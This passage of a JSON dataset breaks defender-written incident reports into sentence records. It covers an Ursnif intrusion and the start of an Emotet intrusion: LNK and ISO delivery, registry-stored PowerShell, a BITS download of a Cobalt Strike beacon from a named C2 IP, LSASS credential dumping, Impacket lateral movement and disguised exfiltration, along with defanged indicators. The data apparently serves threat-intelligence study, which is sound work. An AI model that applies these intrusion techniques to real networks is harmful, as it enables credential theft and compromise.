        "type": "",
        "report": "r-dfir-5",
        "line": 1,
        "index": 4214
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S2",
        "text": "Once executed, the malware conducted automatic discovery on the beachhead host, as we have observed with other loaders such as IcedID.",
        "type": "",
        "report": "r-dfir-5",
        "line": 2,
        "index": 4215
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S3",
        "text": "The malware also established persistence on the host with the creation of a registry run key.\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 3,
        "index": 4216
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S4",
        "text": "Approximately 4 days after the initial infection, new activity on the host provided a clear distinction of a threat actor performing manual actions (hands on keyboard).",
        "type": "",
        "report": "r-dfir-5",
        "line": 4,
        "index": 4217
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S5",
        "text": "The threat actor used a Background Intelligent Transfer Service (BITS) job to download a Cobalt Strike beacon, and then used the beacon for subsequent actions.\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 5,
        "index": 4218
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S6",
        "text": "The threat actor first ran some initial discovery on the host using built-in Windows utilities like ipconfig, systeminfo, net, and ping.",
        "type": "",
        "report": "r-dfir-5",
        "line": 6,
        "index": 4219
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S7",
        "text": "Shortly afterwards, the threat actor injected into various processes and then proceeded to access lsass memory on the host to extract credentials.",
        "type": "",
        "report": "r-dfir-5",
        "line": 7,
        "index": 4220
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S8",
        "text": "Using the credentials extracted from memory, the threat actors began to move laterally.",
        "type": "",
        "report": "r-dfir-5",
        "line": 8,
        "index": 4221
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S9",
        "text": "They targeted a domain controller and used Impacket\u2019s wmiexec.py to execute code on the remote host.",
        "type": "",
        "report": "r-dfir-5",
        "line": 9,
        "index": 4222
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S10",
        "text": "This included executing both a msi installer for the RMM tools Atera and Splashtop, as well as a Cobalt Strike executable beacon.",
        "type": "",
        "report": "r-dfir-5",
        "line": 10,
        "index": 4223
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S11",
        "text": "These files were transferred to the domain controller over SMB.",
        "type": "",
        "report": "r-dfir-5",
        "line": 11,
        "index": 4224
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S12",
        "text": "After connecting to the Cobalt Strike beacon on the domain controller, the threat actor executed another round of discovery tasks and dumped lsass memory on the domain controller.",
        "type": "",
        "report": "r-dfir-5",
        "line": 12,
        "index": 4225
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S13",
        "text": "Finally, they dropped a script named adcomp.bat which executed a PowerShell command to collect data on computers in the Windows domain.",
        "type": "",
        "report": "r-dfir-5",
        "line": 13,
        "index": 4226
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S14",
        "text": "The following day, there was a short check-in on the beachhead host from a Cobalt Strike beacon, no other activity occurred until near the end of the day.",
        "type": "",
        "report": "r-dfir-5",
        "line": 14,
        "index": 4227
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S15",
        "text": "At that time, the threat actor became active by initiating a proxied RDP connection via the Cobalt Strike beacon to the domain controller.",
        "type": "",
        "report": "r-dfir-5",
        "line": 15,
        "index": 4228
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S16",
        "text": "From there, the threat actor began connecting to various hosts across the network.",
        "type": "",
        "report": "r-dfir-5",
        "line": 16,
        "index": 4229
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S17",
        "text": "One host of interest was one of the backup servers, which was logged into, the state of backups were checked and running processes were reviewed before exiting the session.",
        "type": "",
        "report": "r-dfir-5",
        "line": 17,
        "index": 4230
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S18",
        "text": "The threat actor was later evicted from the network.\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 18,
        "index": 4231
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S19",
        "text": "In this case, the user had saved the file 3488164.iso to the their downloads folder and mounted it.\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 19,
        "index": 4232
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S20",
        "text": "Once mounted, the new drive contained a LNK file 6570872.lnk and hidden folder \u201cme\u201d.\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 20,
        "index": 4233
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S21",
        "text": "If we parse this LNK file with LECmd (by Eric Zimmerman), it highlights the execution path and the icon it appears as:\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 21,
        "index": 4234
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S22",
        "text": "The contents of hidden folder \u201cme\u201d, included several files and folders that were used for the execution of Ursnif.",
        "type": "",
        "report": "r-dfir-5",
        "line": 22,
        "index": 4235
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S23",
        "text": "Of interest, the folder included a legitimate copy of rundll32.exe (renamed to 123.com ).\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 23,
        "index": 4236
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S24",
        "text": "Summary of the files found in 3488164.iso (a detailed break down of these can be found in Execution):\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 24,
        "index": 4237
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S25",
        "text": "Once the user had mounted the ISO and the LNK file was executed by the user, the complex execution flow started.\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 25,
        "index": 4238
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S26",
        "text": "Highlighted in Initial Access, the LNK file would execute a batch script alsoOne.bat .",
        "type": "",
        "report": "r-dfir-5",
        "line": 26,
        "index": 4239
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S27",
        "text": "This script called a JavaScript file canWell.js in the same directory and provided a number of strings as arguments.\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 27,
        "index": 4240
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S28",
        "text": "- alsoOne.bat\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 28,
        "index": 4241
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S29",
        "text": "- canWell.js\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 29,
        "index": 4242
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S30",
        "text": "The JS file was then executed with wscript.exe and used the provided command line arguments, which created and executed the following command using WScript.Shell.Exec():\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 30,
        "index": 4243
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S31",
        "text": "Using the SRUM database, we were able to determine that the custom rundll32.exe binary downloaded approximately 0.4 MB of data.",
        "type": "",
        "report": "r-dfir-5",
        "line": 31,
        "index": 4244
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S32",
        "text": "Once the malware was executed, the parent instance of explorer launched MSHTA with the following command:\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 32,
        "index": 4245
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S33",
        "text": "This oneliner created a new ActiveX object to eval() the content stored in the registry key in the users registry hive.",
        "type": "",
        "report": "r-dfir-5",
        "line": 33,
        "index": 4246
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S34",
        "text": "The content of the value \u201cActiveDevice\u201d:\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 34,
        "index": 4247
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S35",
        "text": "The payload used another ActiveX object to run a PowerShell command.",
        "type": "",
        "report": "r-dfir-5",
        "line": 35,
        "index": 4248
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S36",
        "text": "This command created additional aliases of common default PowerShell aliases gp (Get-ItemProperty) and iex (Invoke-Expression).",
        "type": "",
        "report": "r-dfir-5",
        "line": 36,
        "index": 4249
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S37",
        "text": "These two new aliases were used to get and execute the content in another registry value \u201cMemoryJunk\u201d:\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 37,
        "index": 4250
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S38",
        "text": "Analyst Note: The names of the registry values changed when we ran the payload in a sandbox during analysis, and hence suspected to be generated at random at execution.\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 38,
        "index": 4251
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S39",
        "text": "The last registry key was used to store additional PowerShell code.",
        "type": "",
        "report": "r-dfir-5",
        "line": 39,
        "index": 4252
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S40",
        "text": "This script called a combination of QueueUserAPC, GetCurrentThreadId, OpenThread, and VirtualAlloc to perform process injection of shellcode stored in Base64.",
        "type": "",
        "report": "r-dfir-5",
        "line": 40,
        "index": 4253
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S41",
        "text": "When Add-Type cmdlet is executed, the C# compiler csc.exe is invoked by PowerShell to compile this class definition, which results in the creation of temporary files in %APPDATA%\\Local\\Temp.\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 41,
        "index": 4254
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S42",
        "text": "Finally, a unique command spawned from the parent explorer.exe process that was called pause.exe with multiple arguments, which appeared to not provide any additional functionality.",
        "type": "",
        "report": "r-dfir-5",
        "line": 42,
        "index": 4255
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S43",
        "text": "A sigma rule for this cmdline can be found in the Detections section of this report.\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 43,
        "index": 4256
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S44",
        "text": "At this point in time, less than a minute of time has elapsed since the user first opened the malware.\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 44,
        "index": 4257
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S45",
        "text": "Once the malware was established on the host, there was limited malicious activity, until around 3 days later.",
        "type": "",
        "report": "r-dfir-5",
        "line": 45,
        "index": 4258
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S46",
        "text": "That is when we began to observe evidence indicative of \u201chands-on-keyboard\u201d activity.",
        "type": "",
        "report": "r-dfir-5",
        "line": 46,
        "index": 4259
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S47",
        "text": "An instance of cmd.exe was launched through explorer.exe which ran the following command:\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 47,
        "index": 4260
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S48",
        "text": "Analyst Note: Ursnif has been known to have VNC-like capabilities.",
        "type": "",
        "report": "r-dfir-5",
        "line": 48,
        "index": 4261
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S49",
        "text": "It is possible this explorer.exe \u279d cmd.exe session was through a VNC session.\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 49,
        "index": 4262
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S50",
        "text": "This PowerShell command started a BITS job to download a Cobalt Strike beacon from 193.201.9[.]199 and saved it with a random name to %TEMP%.",
        "type": "",
        "report": "r-dfir-5",
        "line": 50,
        "index": 4263
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S51",
        "text": "It then read the file into a variable, and deleted it before executing content with IEX .\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 51,
        "index": 4264
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S52",
        "text": "The event log Microsoft-Windows-Bits-Client%254Operational.evtx corroborated this activity:\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 52,
        "index": 4265
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S53",
        "text": "The activity following this event demonstrated a clear distinction of the threat actor performing discovery manually.",
        "type": "",
        "report": "r-dfir-5",
        "line": 53,
        "index": 4266
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S54",
        "text": "Once the foothold had been achieved, after execution of Ursnif on the beachhead host, persistence was achieved by creating a \u2018Run\u2019 key named ManagerText which was configured to execute a LNK file which executed a PowerShell script.",
        "type": "",
        "report": "r-dfir-5",
        "line": 54,
        "index": 4267
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S55",
        "text": "We observed a process created by Cobalt Strike accessing lsass.exe.",
        "type": "",
        "report": "r-dfir-5",
        "line": 55,
        "index": 4268
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S56",
        "text": "The GrantedAccess code of 0x1010 is a known indicator of such tools as Mimikatz.",
        "type": "",
        "report": "r-dfir-5",
        "line": 56,
        "index": 4269
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S57",
        "text": "This was observed on both the beachhead host and a domain controller.\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 57,
        "index": 4270
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S58",
        "text": "As we have observed in other malware, Ursnif ran a number of automated discovery commands to gain information about the environment.",
        "type": "",
        "report": "r-dfir-5",
        "line": 58,
        "index": 4271
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S59",
        "text": "The following commands were executed and their standard output was redirected to append to a file in the user\u2019s %APPDATA%\\Local\\Temp\\\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 59,
        "index": 4272
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S60",
        "text": "Once the threat actor had Cobalt Strike running on the beachhead host, they ran the following commands:\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 60,
        "index": 4273
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S61",
        "text": "The threat actor quickly took interest in a support account.",
        "type": "",
        "report": "r-dfir-5",
        "line": 61,
        "index": 4274
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S62",
        "text": "This account belonged to the Domain Admin group.\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 62,
        "index": 4275
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S63",
        "text": "The threat actor also used a batch script to collect a list of all computer objects on the domain using C:\\Windows\\system32\\cmd.exe /C adcomp.bat which contained the PowerShell command:\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 63,
        "index": 4276
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S64",
        "text": "During the final actions taken by the threat actors before eviction, after completing RDP connections to various hosts on the network, the threat actors checked running processes on the accessed hosts via taskmanager, which were started via their interactive RDP session as noted by the /4 command line argument.",
        "type": "",
        "report": "r-dfir-5",
        "line": 64,
        "index": 4277
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S65",
        "text": "WMI was used to pivot to a domain controller on the network.",
        "type": "",
        "report": "r-dfir-5",
        "line": 65,
        "index": 4278
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S66",
        "text": "The actor leveraged Impacket\u2019s wmiexec.py to execute commands with a semi-interactive shell, most likely using credentials gathered by the previous LSASS access.\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 66,
        "index": 4279
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S67",
        "text": "The commands executed included directory traversal, host discovery, and execution of tools on the DC.\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 67,
        "index": 4280
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S68",
        "text": "A breakdown of the parent and child processes invoked:\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 68,
        "index": 4281
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S69",
        "text": "The command can be broken down as follows:\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 69,
        "index": 4282
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S70",
        "text": "- \u2018Q\u2019 indicates turn off echo \u2013 no response.\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 70,
        "index": 4283
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S71",
        "text": "- \u2018C\u2019 indicates to stop after command execution.\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 71,
        "index": 4284
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S72",
        "text": "- The 127.0.01 and ADMIN$ indicates C:\\Windows.\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 72,
        "index": 4285
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S73",
        "text": "Output is achieved via the parameter \u20182>&1\u2019, to redirect errors and output to one file:\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 73,
        "index": 4286
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S74",
        "text": "This command line closely resembles the code within the wmiexec.py as part of the Impacket tool maintained by Fortra.\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 74,
        "index": 4287
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S75",
        "text": "As Impacket interacts with remote endpoints via WMI over TCP via DCERPC, its possible to inspect network level packets:\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 75,
        "index": 4288
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S76",
        "text": "The use of Impacket by threat actors has been recently detailed by CISA in alert AA22-277A \u2013 Impacket and Exfiltration Tool Used to Steal Sensitive Information from Defense Industrial Base Organization.",
        "type": "",
        "report": "r-dfir-5",
        "line": 76,
        "index": 4289
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S77",
        "text": "The Impacket process hierarchy in this case can be visualized as:\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 77,
        "index": 4290
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S78",
        "text": "At the network level, commands are issued by DCOM/RPC port 135, with responses by SMB using port 445.",
        "type": "",
        "report": "r-dfir-5",
        "line": 78,
        "index": 4291
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S79",
        "text": "We can observe a number of WMI requests via DCERPC from one endpoint to a target endpoint based on the ports.",
        "type": "",
        "report": "r-dfir-5",
        "line": 79,
        "index": 4292
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S80",
        "text": "Correlating the network activity to the host activity confirms that the \u2018Powershell.exe\u2019 process initiated the WMI requests.",
        "type": "",
        "report": "r-dfir-5",
        "line": 80,
        "index": 4293
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S81",
        "text": "The destination port is within the ephemeral port range 49152\u201365535, which is for short-lived, time based, communications RFC 6335.\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 81,
        "index": 4294
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S82",
        "text": "13Cubed (Richard Davis) also released an amazing resource to investigate Impacket related incidents here: https://www.13cubed.com/downloads/impacket_exec_commands_cheat_sheet_poster.pdf\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 82,
        "index": 4295
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S83",
        "text": "One of the observed commands invoked via WMI was \u2018firefox.exe\u2019.\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 83,
        "index": 4296
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S84",
        "text": "This was dropped on the DC and spawned a number of processes and invoked a number of hands-on commands.\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 84,
        "index": 4297
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S85",
        "text": "The process generated a significant volume of network connections to 193.201.9[.]199, averaging ~6K requests per hour, equating to >150K connections throughout the duration of the intrusion.\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 85,
        "index": 4298
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S86",
        "text": "RDP was also used by the threat actor on the final two days of the intrusion to connect to various hosts from a domain controller proxying the traffic via the firefox.exe Cobalt Strike beacon.\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 86,
        "index": 4299
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S87",
        "text": "Ursnif was seen using the following domains and IPs:\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 87,
        "index": 4300
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S88",
        "text": "We also observed several modules for Ursnif downloaded from the following IP:\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 88,
        "index": 4301
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S89",
        "text": "JoeSandbox reported this sample having the following configuration:\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 89,
        "index": 4302
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S90",
        "text": "Pivoting on domains registered in WHOIS with the email [email protected] or organization Rus Lak , reveals many similar domains as seen in this intrusion.",
        "type": "",
        "report": "r-dfir-5",
        "line": 90,
        "index": 4303
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S91",
        "text": "The following Cobalt Strike C2 server was observed:\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 91,
        "index": 4304
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S92",
        "text": "The following Cobalt Strike configuration was observed:\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 92,
        "index": 4305
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S93",
        "text": "Checking the certificate used, reveals that it is a default SSL certificate for Cobalt Strike, 83cd09b0f73c909bfc14883163a649e1d207df22 .\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 93,
        "index": 4306
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S94",
        "text": "Even though the threat actor installed these agents, we did not observe any activity with these tools.\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 94,
        "index": 4307
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S95",
        "text": "Several HTTP Post events were observed to the identified domains denterdrigx[.]com, superliner[.]top and 5.42.199[.]83, masquerading as image uploads.\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 95,
        "index": 4308
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S96",
        "text": "The user agent \u2018Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 10.0; Win64; x64)\u2019, an unusual browser configuration to masquerade as, which indicates use of Internet Explorer 8.0 (that was released ~2009).",
        "type": "",
        "report": "r-dfir-5",
        "line": 96,
        "index": 4309
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S97",
        "text": "The POST event included a MIME part indicating file upload activity\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 97,
        "index": 4310
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S98",
        "text": "The example HTTP stream containing the content\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 98,
        "index": 4311
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S99",
        "text": "The file that was uploaded 775E.bin was deleted by the injected \u2018Explorer.exe\u2019 process from the target endpoint in folder \u2018\\Users\\<REDACTED>\\AppData\\Local\\Temp\u2019\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 99,
        "index": 4312
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S100",
        "text": "The exfiltration activity along with the beacon activity can be detected using the following network signatures: ET MALWARE Ursnif Variant CnC Data Exfil and ET MALWARE Ursnif Variant CnC Beacon.",
        "type": "",
        "report": "r-dfir-5",
        "line": 100,
        "index": 4313
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S101",
        "text": "In this example, the mix of activity can be observed as:\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 101,
        "index": 4314
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S102",
        "text": "The threat actor was able to RDP to a backup server using the admin credentials they acquired.",
        "type": "",
        "report": "r-dfir-5",
        "line": 102,
        "index": 4315
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S103",
        "text": "Using the logs in Microsoft-Windows-TerminalServices-LocalSessionManager/Operational we were able to determine the threat actor spent approximately 10 minutes on the backup server before disconnecting their RDP session.",
        "type": "",
        "report": "r-dfir-5",
        "line": 103,
        "index": 4316
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S104",
        "text": "By doing this, they revealed the workstation name of the client: WIN-RRRU9REOK18 .\n",
        "type": "",
        "report": "r-dfir-5",
        "line": 104,
        "index": 4317
    },
    {
        "id": "dfir-reports-filtered/r-dfir-5.md:::S105",
        "text": "During that time, the threat actor undertook a number of hands-on keyboard actions; this included reviewing backups in a backup console, checking on running tasks, and using notepad to paste in the following content.",
        "type": "",
        "report": "r-dfir-5",
        "line": 105,
        "index": 4318
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S0",
        "text": "The intrusion began when a user double clicked a LNK file, which then executed encoded Powershell commands to download an Emotet DLL onto the computer.",
        "type": "",
        "report": "r-dfir-6",
        "line": 0,
        "index": 4319
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S1",
        "text": "Once executed, Emotet setup a Registry Run Key to maintain persistence on the beachhead host.",
        "type": "",
        "report": "r-dfir-6",
        "line": 1,
        "index": 4320
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S2",
        "text": "Emotet, then proceeded to execute a short list of discover commands using the Windows utilities systeminfo, ipconfig, and nltest targeting the network\u2019s domain controllers.",
        "type": "",
        "report": "r-dfir-6",
        "line": 2,
        "index": 4321
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S3",
        "text": "These commands would go on to be repeated daily by the Emotet process.",
        "type": "",
        "report": "r-dfir-6",
        "line": 3,
        "index": 4322
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S4",
        "text": "Around one and one-half hours after execution, Emotet began sending spam emails, mailing new malicious attachments to continue spreading.",
        "type": "",
        "report": "r-dfir-6",
        "line": 4,
        "index": 4323
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S5",
        "text": "Similar activity continued over the second day, but on the third day of the incident, Emotet dropped a Cobalt Strike executable beacon onto the beachhead host.",
        "type": "",
        "report": "r-dfir-6",
        "line": 5,
        "index": 4324
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S6",
        "text": "Using the Cobalt Strike beacon, the threat actors began conducting a new round of discovery activity.",
        "type": "",
        "report": "r-dfir-6",
        "line": 6,
        "index": 4325
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S7",
        "text": "Windows net commands were run, targeting domain groups and computers, nltest was executed again, and they also used tasklist and ping to investigate a remote host.\n",
        "type": "",
        "report": "r-dfir-6",
        "line": 7,
        "index": 4326
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S8",
        "text": "The threat actor then moved laterally to a workstation.",
        "type": "",
        "report": "r-dfir-6",
        "line": 8,
        "index": 4327
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S9",
        "text": "They first attempted this action using a PowerShell beacon and a remote service on the host, but while the script did execute on the remote host, it appeared to fail to connect to the command and control server.",
        "type": "",
        "report": "r-dfir-6",
        "line": 9,
        "index": 4328
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S10",
        "text": "Next, they proceeded to transfer a beacon executable over SMB to the remote host\u2019s ProgramData directory.",
        "type": "",
        "report": "r-dfir-6",
        "line": 10,
        "index": 4329
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S11",
        "text": "This beacon was then successfully executed via WMI and connected successfully to the threat actors server.\n",
        "type": "",
        "report": "r-dfir-6",
        "line": 11,
        "index": 4330
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S12",
        "text": "Once on this new host the threat actors proceeded to run the net commands to review the Domain Administrators group again.",
        "type": "",
        "report": "r-dfir-6",
        "line": 12,
        "index": 4331
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S13",
        "text": "They then proceeded to dump credentials from the LSASS process on the host.",
        "type": "",
        "report": "r-dfir-6",
        "line": 13,
        "index": 4332
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S14",
        "text": "With some further process injection they then began to enumerate SMB shares across the environment and on finding a primary file server reviewed several documents present on the server.",
        "type": "",
        "report": "r-dfir-6",
        "line": 14,
        "index": 4333
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S15",
        "text": "This Cobalt Strike server stopped communicating shortly there after.\n",
        "type": "",
        "report": "r-dfir-6",
        "line": 15,
        "index": 4334
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S16",
        "text": "On the fourth day of the intrusion, Emotet dropped a new Cobalt Strike beacon.",
        "type": "",
        "report": "r-dfir-6",
        "line": 16,
        "index": 4335
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S17",
        "text": "Again, some net command discovery was run for domain admins and domain controller servers.",
        "type": "",
        "report": "r-dfir-6",
        "line": 17,
        "index": 4336
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S18",
        "text": "A flight of netlogon authentications were observed from the beachhead host to the domain controller as a possible attempt at exploiting the domain controller.\n",
        "type": "",
        "report": "r-dfir-6",
        "line": 18,
        "index": 4337
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S19",
        "text": "The threat actors, however, proceeded along a more traditional path, using SMB file transfers and remote services to move laterally across domain controllers and several other servers in the environment using Cobalt Strike beacon DLL\u2019s.",
        "type": "",
        "report": "r-dfir-6",
        "line": 19,
        "index": 4338
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S20",
